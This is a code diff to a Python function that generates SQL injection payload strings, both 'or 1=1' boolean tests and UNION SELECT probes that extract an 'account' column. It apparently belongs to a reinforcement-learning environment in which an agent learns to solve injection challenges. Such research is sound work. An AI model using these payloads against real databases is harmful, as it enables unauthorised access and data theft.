@@ -1,8 +1,8 @@
 
 def generate_actions(max_columns = 5, escapes = ["'", '"',""]):
     prelim = [
-        "{0} and 1=1 --",
-        "{0} and 1=2 --"
+        "1{0} or 1=1 --",
+        "1{0} or 1=2 --"
     ]
 
     #XXX To use row_confirmation we need to update the environment to give a reward for the correct escape and rows, i.e. extracting NONE,NONE,NONE..
@@ -10,8 +10,8 @@ def generate_actions(max_columns = 5, escapes = ["'", '"',""]):
     row_confirmation = []
     flag_actions = []
     for i in range(1,max_columns+1):
-        row_confirmation.append("{0} union select"+ " NULL,"*i)
-        flag_actions.append("{0} union select account," + " NULL,"*(i-1))
+        row_confirmation.append("1{0} union select"+ " NULL,"*i)
+        flag_actions.append("1{0} union select account," + " NULL,"*(i-1))
 
         #Maybe not the best way to remove the last comma and add comment lines, but it will do
         row_confirmation[-1] = row_confirmation[-1][:-1] + " --"
